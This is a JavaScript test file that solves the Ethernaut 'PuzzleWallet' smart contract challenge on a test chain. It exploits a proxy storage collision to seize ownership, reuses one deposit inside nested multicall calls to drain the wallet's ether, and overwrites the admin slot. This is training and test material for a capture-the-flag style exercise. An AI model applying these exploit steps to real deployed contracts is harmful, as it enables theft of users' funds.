const ethutil = require('ethereumjs-util')

const PuzzleProxy  = artifacts.require('PuzzleProxy');
const PuzzleWalletFactory = artifacts.require('PuzzleWalletFactory')
const PuzzleWallet = artifacts.require('PuzzleWallet')
const Ethernaut = artifacts.require('./Ethernaut.sol')

const { BN, constants, expectEvent, expectRevert } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')

contract('PuzzleWallet', function(accounts) {

  let ethernaut
  let level
  const [player, owner] = accounts;

  beforeEach(async function() {
    ethernaut = await Ethernaut.new();
    level = await PuzzleWalletFactory.new()
    await ethernaut.registerLevel(level.address)
  });

  it.only('should allow the player to solve the level', async function() {

    const instance = await utils.createLevelInstance(
      ethernaut, level.address, player, PuzzleWallet,
      {from: player, value: web3.utils.toWei('1', 'ether')}
    )

    assert.equal(level.address, await instance.owner(), 'Owner is not the factory')
    assert.equal(web3.utils.toWei('1', 'ether'), (await instance.balances(level.address)).toString())
    
    const balance = await instance.maxBalance();
    const proxy = await PuzzleProxy.at(instance.address)

    // checks that the initial owner address is the puzzle wallet factory contract
    assert.equal(level.address, await instance.owner());
    await proxy.proposeNewAdmin(player)

    // check that the player has placed their address in the owner slot
    assert.equal(player, await instance.owner(), "Player is not the owner")

    // check that player is not whitelisted yet
    assert.isFalse(await instance.whitelisted(player), 'Player is not whitelisted')

    // Player whitelists herself
    await instance.addToWhitelist(player, { from: player })

    const { data: depositData } = await instance.deposit.request()
    const { data: nestedMulticallData } = await instance.multicall.request([ depositData ])
    const { data: executeData } = await instance.execute.request(player, web3.utils.toWei('2', 'ether'), [])

    const calls = [
      depositData,
      nestedMulticallData,
      executeData,
    ]

    await instance.multicall(calls, { from: player, value: web3.utils.toWei('1', 'ether')})
    // Check that balance in the contract is 0
    assert.equal(await web3.eth.getBalance(instance.address), 0);
    

    // update the maxBalance to take over adminship
    await instance.setMaxBalance(player, { from: player });

    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )
    assert.equal(ethCompleted, true)
  });
});
